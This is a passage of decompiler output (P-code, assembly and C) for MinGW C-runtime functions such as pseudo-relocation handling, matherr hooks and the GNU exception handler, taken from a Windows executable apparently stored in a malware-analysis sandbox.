(unique, 0x10000430, 1) INT_EQUAL (register, 0x10, 4) , (const, 0x0, 4)
(unique, 0x10000428, 8) INT_ADD (register, 0x30, 8) , (unique, 0xdc00, 8)
 ---  CBRANCH (ram, 0x140001d7b, 1) , (unique, 0x10000430, 1)
(unique, 0xef00, 1) INT_SLESS (const, 0xffffffff, 8) , (unique, 0x10000428, 8)
 ---  CBRANCH (ram, 0x140001c73, 1) , (unique, 0xef00, 1)
(unique, 0xed00, 1) INT_SLESS (unique, 0x10000428, 8) , (const, 0xffffffff80000000, 8)
 ---  CBRANCH (ram, 0x140001c73, 1) , (unique, 0xed00, 1)
(register, 0x30, 8) MULTIEQUAL (register, 0x30, 8) , (unique, 0x10000416, 8) , (unique, 0x10000416, 8) , (unique, 0x1000041f, 8) , (unique, 0x1000041f, 8) , (unique, 0x10000428, 8) , (unique, 0x10000428, 8)
(register, 0x8, 4) MULTIEQUAL (unique, 0x1000021a, 4) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4) , (register, 0x8, 4)
(unique, 0x10000346, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff98, 8)
(unique, 0x100005d2, 8) CAST (unique, 0x10000346, 8)
(unique, 0x100005da, 8) INT_ADD (unique, 0x100005d2, 8) , (unique, 0x100000ba, 8)
(unique, 0x4b00, 8) CAST (unique, 0x100005da, 8)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4b00, 8) , (register, 0x30, 8)
(register, 0x10, 8) INT_ZEXT (register, 0x8, 4)
(unique, 0x1000035e, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x100005e2, 8) CAST (unique, 0x1000035e, 8)
(unique, 0x100005ea, 8) INT_ADD (unique, 0x100005e2, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x100005ea, 8)
(unique, 0x1000021e, 8) PTRSUB (const, 0x0, 8) , (const, 0x140001c89, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x155, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (unique, 0x1000021e, 8)
(unique, 0x1000023e, 8) COPY (const, 0x140004428, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x156, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x156, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x156, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x156, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x156, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x156, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x156, 4)
 ---  CALL (ram, 0x140001910, 8) , (unique, 0x1000023e, 8) , (register, 0x10, 8) , (register, 0x38, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x1400044f0, 8) COPY (ram, 0x1400044f0, 8)
(ram, 0x140004500, 8) COPY (ram, 0x140004500, 8)
(ram, 0x1400070a0, 4) COPY (ram, 0x1400070a0, 4)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x1, 4)
(unique, 0x100003a6, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x100005f2, 8) CAST (unique, 0x100003a6, 8)
(unique, 0x100005fa, 8) INT_ADD (unique, 0x100005f2, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x100005fa, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x35c, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (const, 0x140001d9f, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x35d, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x35d, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x35d, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x35d, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x35d, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x35d, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x35d, 4)
 ---  CALL (ram, 0x140001980, 8) , (register, 0x38, 8)
(register, 0x30, 4) SUBPIECE (unique, 0x10000428, 8) , (const, 0x0, 4)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x35f, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x35f, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x35f, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x35f, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x35f, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x35f, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x38, 8) , (register, 0x30, 4)
 ---  BRANCH (ram, 0x140001c22, 1)
(stack, 0xffffffffffffff70, 8) MULTIEQUAL (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8)
(ram, 0x1400070a8, 8) MULTIEQUAL (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8)
(ram, 0x1400070a4, 4) MULTIEQUAL (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4)
(ram, 0x1400070a0, 4) MULTIEQUAL (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4)
(ram, 0x140004500, 8) MULTIEQUAL (ram, 0x140004500, 8) , (ram, 0x140004500, 8) , (ram, 0x140004500, 8) , (ram, 0x140004500, 8)
(ram, 0x1400044f0, 8) MULTIEQUAL (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(register, 0x18, 8) PTRADD (register, 0x18, 8) , (const, 0x3, 8) , (const, 0x4, 8)
(register, 0x200, 1) INT_LESSEQUAL (unique, 0x1000045b, 8) , (register, 0x18, 8)
 ---  CBRANCH (ram, 0x140001d00, 1) , (register, 0x200, 1)
(stack, 0xffffffffffffff70, 8) MULTIEQUAL (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8)
(ram, 0x1400070a8, 8) MULTIEQUAL (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8)
(ram, 0x1400070a4, 4) MULTIEQUAL (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4)
(ram, 0x1400070a0, 4) MULTIEQUAL (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4)
(ram, 0x140004500, 8) MULTIEQUAL (ram, 0x140004500, 8) , (ram, 0x140004500, 8) , (ram, 0x140004500, 8)
(ram, 0x1400044f0, 8) MULTIEQUAL (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(unique, 0xed00, 1) INT_SLESS (const, 0x0, 4) , (ram, 0x1400070a4, 4)
 ---  CBRANCH (ram, 0x140001b11, 1) , (unique, 0xed00, 1)
(register, 0x18, 8) COPY (const, 0x0, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffffb4, 8)
(unique, 0x10000216, 4) COPY (const, 0x0, 4)
(stack, 0xffffffffffffff70, 8) MULTIEQUAL (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8)
(ram, 0x1400070a8, 8) MULTIEQUAL (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8)
(ram, 0x1400070a4, 4) MULTIEQUAL (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4)
(ram, 0x1400070a0, 4) MULTIEQUAL (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4)
(ram, 0x140004500, 8) MULTIEQUAL (ram, 0x140004500, 8) , (ram, 0x140004500, 8)
(ram, 0x1400044f0, 8) MULTIEQUAL (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(register, 0xa0, 4) MULTIEQUAL (unique, 0x10000216, 4) , (register, 0xa0, 4)
(register, 0x18, 8) MULTIEQUAL (register, 0x18, 8) , (register, 0x18, 8)
(unique, 0x100002ae, 8) PTRSUB (ram, 0x1400070a8, 8) , (const, 0x0, 8)
(unique, 0x10000602, 8) CAST (unique, 0x100002ae, 8)
(unique, 0x1000060a, 8) INT_ADD (unique, 0x10000602, 8) , (register, 0x18, 8)
(register, 0x0, 8) CAST (unique, 0x1000060a, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (register, 0x0, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb00, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001d3f, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x4, 8) , (const, 0x4, 8)
(unique, 0x10000612, 8) CAST (unique, 0x4400, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x10000612, 8)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x2, 8) , (const, 0x4, 8)
(unique, 0x1000061a, 8) CAST (unique, 0x4400, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x1000061a, 8)
(unique, 0x1000038e, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffff70, 8)
(unique, 0x10000622, 8) CAST (unique, 0x1000038e, 8)
(unique, 0x1000062a, 8) INT_ADD (unique, 0x10000622, 8) , (unique, 0x100000ba, 8)
(register, 0x20, 8) CAST (unique, 0x1000062a, 8)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x1ab, 4)
 ---  STORE (const, 0x1b1, 4) , (register, 0x20, 8) , (const, 0x140001d3f, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x1ac, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x1ac, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x1ac, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x1ac, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x1ac, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x1ac, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x1ac, 4)
 ---  CALL (ram, 0x1400081f0, 8) , (unique, 0xdc00, 8) , (unique, 0xdc00, 8) , (unique, 0xdb00, 4) , (unique, 0x4400, 8)
(stack, 0xffffffffffffff70, 8) MULTIEQUAL (stack, 0xffffffffffffff70, 8) , (stack, 0xffffffffffffff70, 8)
(ram, 0x1400070a8, 8) MULTIEQUAL (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8)
(ram, 0x1400070a4, 4) MULTIEQUAL (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4)
(ram, 0x1400070a0, 4) MULTIEQUAL (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4)
(ram, 0x140004500, 8) MULTIEQUAL (ram, 0x140004500, 8) , (ram, 0x140004500, 8)
(ram, 0x1400044f0, 8) MULTIEQUAL (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(register, 0xa0, 4) INT_ADD (register, 0xa0, 4) , (const, 0x1, 4)
(register, 0x18, 8) INT_ADD (register, 0x18, 8) , (const, 0x28, 8)
(unique, 0xea80, 1) INT_SLESS (register, 0xa0, 4) , (ram, 0x1400070a4, 4)
 ---  CBRANCH (ram, 0x140001d20, 1) , (unique, 0xea80, 1)
(ram, 0x1400070a8, 8) MULTIEQUAL (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8)
(ram, 0x1400070a4, 4) MULTIEQUAL (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4)
(ram, 0x1400070a0, 4) MULTIEQUAL (ram, 0x1400070a0, 4) , (ram, 0x1400070a0, 4)
(ram, 0x140004500, 8) MULTIEQUAL (ram, 0x140004500, 8) , (ram, 0x140004500, 8)
(ram, 0x1400044f0, 8) MULTIEQUAL (ram, 0x1400044f0, 8) , (ram, 0x1400044f0, 8)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x1400044f0, 8) COPY (ram, 0x1400044f0, 8)
(ram, 0x140004500, 8) COPY (ram, 0x140004500, 8)
(ram, 0x1400070a0, 4) COPY (ram, 0x1400070a0, 4)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
PUSH RBP
PUSH R15
PUSH R14
PUSH R13
PUSH R12
PUSH RDI
PUSH RSI
PUSH RBX
SUB RSP,0x48
LEA RBP,[RSP + 0x40]
MOV R12D,dword ptr [0x1400070a0]
TEST R12D,R12D
JZ 0x140001b28
LEA RSP,[RBP + 0x8]
POP RBX
POP RSI
POP RDI
POP R12
POP R13
POP R14
POP R15
POP RBP
RET
MOV dword ptr [0x1400070a0],0x1
CALL 0x140002470
CDQE
LEA RAX,[RAX + RAX*0x4]
LEA RAX,[0xf + RAX*0x8]
AND RAX,-0x10
CALL 0x1400026d0
MOV R13,qword ptr [0x1400044f0]
MOV RBX,qword ptr [0x140004500]
MOV dword ptr [0x1400070a4],0x0
SUB RSP,RAX
LEA RAX,[RSP + 0x30]
MOV qword ptr [0x1400070a8],RAX
MOV RAX,R13
SUB RAX,RBX
CMP RAX,0x7
JLE 0x140001b11
MOV EDX,dword ptr [RBX]
CMP RAX,0xb
JG 0x140001c90
MOV EAX,dword ptr [RBX]
TEST EAX,EAX
JNZ 0x140001e00
MOV EAX,dword ptr [RBX + 0x4]
TEST EAX,EAX
JNZ 0x140001e00
MOV EDX,dword ptr [RBX + 0x8]
CMP EDX,0x1
JNZ 0x140001e40
ADD RBX,0xc
CMP RBX,R13
JNC 0x140001b11
MOV R14,qword ptr [0x1400044e0]
MOV R15D,0xffffffff
JMP 0x140001c2f
CMP ECX,0x8
JZ 0x140001cb0
CMP ECX,0x10
JNZ 0x140001e32
MOVZX ESI,word ptr [RDI]
AND EDX,0xc0
TEST SI,SI
JNS 0x140001dc0
OR RSI,-0x10000
SUB RSI,RAX
ADD RSI,R9
TEST EDX,EDX
JNZ 0x140001c17
CMP RSI,-0x8000
JL 0x140001c73
CMP RSI,0xffff
JG 0x140001c73
MOV RCX,RDI
CALL 0x140001980
MOV word ptr [RDI],SI
ADD RBX,0xc
CMP RBX,R13
JNC 0x140001d00
MOV EAX,dword ptr [RBX]
MOV EDX,dword ptr [RBX + 0x8]
MOV EDI,dword ptr [RBX + 0x4]
ADD RAX,R14
MOVZX ECX,DL
MOV R9,qword ptr [RAX]
ADD RDI,R14
CMP ECX,0x20
JZ 0x140001d58
JBE 0x140001bd0
CMP ECX,0x40
JNZ 0x140001e32
MOV RSI,qword ptr [RDI]
MOV ECX,EDX
SUB RSI,RAX
ADD RSI,R9
AND ECX,0xc0
JNZ 0x140001db0
TEST RSI,RSI
JS 0x140001c22
MOV qword ptr [RSP + 0x20],RSI
MOV EDX,ECX
MOV R8,RDI
LEA RCX,[0x140004428]
CALL 0x140001910
TEST EDX,EDX
JNZ 0x140001e00
MOV EAX,dword ptr [RBX + 0x4]
MOV EDX,EAX
OR EDX,dword ptr [RBX + 0x8]
JNZ 0x140001b9a
ADD RBX,0xc
JMP 0x140001b8d
MOVZX ESI,byte ptr [RDI]
AND EDX,0xc0
TEST SIL,SIL
JNS 0x140001de8
OR RSI,-0x100
SUB RSI,RAX
ADD RSI,R9
TEST EDX,EDX
JNZ 0x140001ce2
CMP RSI,0xff
JG 0x140001c73
CMP RSI,-0x80
JL 0x140001c73
MOV RCX,RDI
ADD RBX,0xc
CALL 0x140001980
MOV byte ptr [RDI],SIL
CMP RBX,R13
JC 0x140001c2f
NOP word ptr [RAX + RAX*0x1]
MOV EDX,dword ptr [0x1400070a4]
TEST EDX,EDX
JLE 0x140001b11
MOV RSI,qword ptr [0x1400081f0]
XOR EBX,EBX
LEA RDI,[RBP + -0x4]
NOP dword ptr [RAX + RAX*0x1]
MOV RAX,qword ptr [0x1400070a8]
ADD RAX,RBX
MOV R8D,dword ptr [RAX]
TEST R8D,R8D
JZ 0x140001d3f
MOV RDX,qword ptr [RAX + 0x10]
MOV RCX,qword ptr [RAX + 0x8]
MOV R9,RDI
CALL RSI
ADD R12D,0x1
ADD RBX,0x28
CMP R12D,dword ptr [0x1400070a4]
JL 0x140001d20
JMP 0x140001b11
MOV ESI,dword ptr [RDI]
AND EDX,0xc0
TEST ESI,ESI
JNS 0x140001dd8
MOV R11,-0x100000000
OR RSI,R11
SUB RSI,RAX
ADD RSI,R9
TEST EDX,EDX
JNZ 0x140001d97
CMP RSI,R15
JG 0x140001c73
MOV RAX,-0x80000001
CMP RSI,RAX
JLE 0x140001c73
MOV RCX,RDI
CALL 0x140001980
MOV dword ptr [RDI],ESI
JMP 0x140001c22
MOV RCX,RDI
CALL 0x140001980
MOV qword ptr [RDI],RSI
JMP 0x140001c22
SUB RSI,RAX
ADD RSI,R9
TEST EDX,EDX
JZ 0x140001c05
JMP 0x140001c17
SUB RSI,RAX
ADD RSI,R9
TEST EDX,EDX
JZ 0x140001d7b
JMP 0x140001d97
SUB RSI,RAX
ADD RSI,R9
TEST EDX,EDX
JZ 0x140001cd3
JMP 0x140001ce2
CMP RBX,R13
JNC 0x140001b11
MOV R14,qword ptr [0x1400044e0]
MOV ESI,dword ptr [RBX + 0x4]
MOV EDI,dword ptr [RBX]
ADD RBX,0x8
ADD RSI,R14
ADD EDI,dword ptr [RSI]
MOV RCX,RSI
CALL 0x140001980
MOV dword ptr [RSI],EDI
CMP RBX,R13
JC 0x140001e10
JMP 0x140001d00
MOV EDX,ECX
LEA RCX,[0x1400043f8]
CALL 0x140001910
LEA RCX,[0x1400043c0]
CALL 0x140001910




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __mingw_raise_matherr
C Decompilation:

/* WARNING: Unknown calling convention */

void __mingw_raise_matherr(int typ,char *name,double a1,double a2,double rslt)

{
  _exception ex;
  
  if (stUserMathErr != (fUserMathErr)0x0) {
    ex.retval = rslt;
    ex.type = typ;
    ex.name = name;
    ex.arg1 = a1;
    ex.arg2 = a2;
    (*stUserMathErr)(&ex);
  }
  return;
}



Pcode Representation:
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x1400070b0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140001e89, 1) , (register, 0x206, 1)
(unique, 0x4b00, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffffc8, 8)
(stack, 0xffffffffffffffe8, 8) COPY (stack, 0x28, 8)
(unique, 0x1000004a, 4) COPY (register, 0x8, 4)
(unique, 0x1000004e, 8) COPY (register, 0x10, 8)
(unique, 0x10000056, 8) COPY (register, 0x1280, 8)
(unique, 0x1000005e, 8) COPY (register, 0x12c0, 8)
(ram, 0x1400070b0, 8) INDIRECT (ram, 0x1400070b0, 8) , (const, 0x2a, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (unique, 0x1000004a, 4) , (const, 0x2a, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (unique, 0x1000004e, 8) , (const, 0x2a, 4)
(stack, 0xffffffffffffffd8, 8) INDIRECT (unique, 0x10000056, 8) , (const, 0x2a, 4)
(stack, 0xffffffffffffffe0, 8) INDIRECT (unique, 0x1000005e, 8) , (const, 0x2a, 4)
(stack, 0xffffffffffffffe8, 8) INDIRECT (stack, 0xffffffffffffffe8, 8) , (const, 0x2a, 4)
 ---  CALLIND (ram, 0x1400070b0, 8) , (unique, 0x4b00, 8)
(ram, 0x1400070b0, 8) MULTIEQUAL (ram, 0x1400070b0, 8) , (ram, 0x1400070b0, 8)
(ram, 0x1400070b0, 8) COPY (ram, 0x1400070b0, 8)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
SUB RSP,0x58
MOV RAX,qword ptr [0x1400070b0]
UNPCKLPD XMM2,XMM3
TEST RAX,RAX
JZ 0x140001e89
MOVSD XMM0,qword ptr [RSP + 0x80]
MOV dword ptr [RSP + 0x20],ECX
LEA RCX,[RSP + 0x20]
MOV qword ptr [RSP + 0x28],RDX
MOVUPS xmmword ptr [RSP + 0x30],XMM2
MOVSD qword ptr [RSP + 0x40],XMM0
CALL RAX
NOP
ADD RSP,0x58
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __mingw_setusermatherr
C Decompilation:

/* WARNING: Unknown calling convention */

void __mingw_setusermatherr(_func_int__exception_ptr *f)

{
  stUserMathErr = f;
  __setusermatherr();
  return;
}



Pcode Representation:
(unique, 0x10000009, 8) COPY (register, 0x8, 8)
(ram, 0x1400070b0, 8) INDIRECT (unique, 0x10000009, 8) , (const, 0x1, 4)
 ---  CALL (ram, 0x140002790, 8)
(ram, 0x1400070b0, 8) COPY (ram, 0x1400070b0, 8)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
MOV qword ptr [0x1400070b0],RCX
JMP 0x140002790




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _gnu_exception_handler
C Decompilation:

/* WARNING: Unknown calling convention */

long _gnu_exception_handler(EXCEPTION_POINTERS *exception_data)

{
  uint uVar1;
  LONG LVar2;
  code *extraout_RAX;
  code *pcVar3;
  code *extraout_RAX_00;
  code *extraout_RAX_01;
  code *extraout_RAX_02;
  
  uVar1 = exception_data->ExceptionRecord->ExceptionCode;
  if (((uVar1 & 0x20ffffff) == 0x20474343) &&
     ((*(byte *)&exception_data->ExceptionRecord->ExceptionFlags & 1) == 0)) {
    return -1;
  }
  if (0xc0000096 < uVar1) goto LAB_140001f0f;
  if (uVar1 < 0xc000008c) {
    if (uVar1 == 0xc0000005) {
      signal(0xb);
      if (extraout_RAX_02 == (code *)0x1) {
        signal(0xb);
        return -1;
      }
      if (extraout_RAX_02 != (code *)0x0) {
        (*extraout_RAX_02)(0xb);
        return -1;
      }
      goto LAB_140001f0f;
    }
    if (uVar1 < 0xc0000006) {
      if (uVar1 == 0x80000002) {
        return -1;
      }
      goto LAB_140001f0f;
    }
    if (uVar1 == 0xc0000008) {
      return -1;
    }
    if (uVar1 != 0xc000001d) goto LAB_140001f0f;
switchD_140001eeb_caseD_c0000096:
    signal(4);
    if (extraout_RAX_00 == (code *)0x1) {
      signal(4);
    }
    else {
      if (extraout_RAX_00 == (code *)0x0) goto LAB_140001f0f;
      (*extraout_RAX_00)(4);
    }
  }
  else {
    switch(uVar1) {
    case 0xc000008d:
    case 0xc000008e:
    case 0xc000008f:
    case 0xc0000090:
    case 0xc0000091:
    case 0xc0000093:
      signal(8);
      pcVar3 = extraout_RAX;
      if (extraout_RAX == (code *)0x1) {
        signal(8);
        _fpreset();
        return -1;
      }
      break;
    default:
      goto switchD_140001eeb_caseD_c0000092;
    case 0xc0000094:
      signal(8);
      pcVar3 = extraout_RAX_01;
      if (extraout_RAX_01 == (code *)0x1) {
        signal(8);
        return -1;
      }
      break;
    case 0xc0000096:
      goto switchD_140001eeb_caseD_c0000096;
    }
    if (pcVar3 == (code *)0x0) {
LAB_140001f0f:
      if (__mingw_oldexcpt_handler != (LPTOP_LEVEL_EXCEPTION_FILTER)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000140001f23. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        LVar2 = (*__mingw_oldexcpt_handler)(exception_data);
        return LVar2;
      }
      return 0;
    }
    (*pcVar3)(8);
  }
switchD_140001eeb_caseD_c0000092:
  return -1;
}



Pcode Representation:
(unique, 0x10000136, 8) PTRSUB (register, 0x8, 8) , (const, 0x0, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x10000136, 8)
(unique, 0x10000148, 8) PTRSUB (unique, 0xdc00, 8) , (const, 0x0, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000148, 8)
(register, 0x8, 4) INT_AND (unique, 0xdb00, 4) , (const, 0x20ffffff, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x8, 4) , (const, 0x20474343, 4)
 ---  CBRANCH (ram, 0x140001f80, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRSUB (unique, 0xdc00, 8) , (const, 0x4, 8)
(unique, 0x10000170, 8) CAST (unique, 0x4400, 8)
(unique, 0xd980, 1) LOAD (const, 0x1b1, 4) , (unique, 0x10000170, 8)
(unique, 0x58a80, 1) INT_AND (unique, 0xd980, 1) , (const, 0x1, 1)
(register, 0x206, 1) INT_EQUAL (unique, 0x58a80, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x140001ec1, 1) , (register, 0x206, 1)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(unique, 0xe780, 1) INT_LESS (const, 0xc0000096, 4) , (unique, 0xdb00, 4)
 ---  CBRANCH (ram, 0x140001f0f, 1) , (unique, 0xe780, 1)
(unique, 0xe600, 1) INT_LESS (unique, 0xdb00, 4) , (const, 0xc000008c, 4)
 ---  CBRANCH (ram, 0x140001f30, 1) , (unique, 0xe600, 1)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0xc0000005, 4)
 ---  CBRANCH (ram, 0x140001fe0, 1) , (register, 0x206, 1)
(register, 0x0, 8) INDIRECT (const, 0x0, 8) , (const, 0x104, 4)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x104, 4)
 ---  CALL (ram, 0x140002800, 8) , (const, 0xb, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x1, 8)
 ---  CBRANCH (ram, 0x14000201c, 1) , (register, 0x206, 1)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x124, 4)
 ---  CALL (ram, 0x140002800, 8) , (const, 0xb, 4)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140001f0f, 1) , (register, 0x206, 1)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x11e, 4)
 ---  CALLIND (register, 0x0, 8) , (const, 0xb, 8)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(unique, 0xe600, 1) INT_LESS (unique, 0xdb00, 4) , (const, 0xc0000006, 4)
 ---  CBRANCH (ram, 0x140001fa0, 1) , (unique, 0xe600, 1)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0x80000002, 4)
 ---  CBRANCH (ram, 0x140001f0f, 1) , (register, 0x206, 1)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb00, 4) , (const, 0xc0000008, 4)
 ---  CBRANCH (ram, 0x140001f70, 1) , (register, 0x206, 1)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
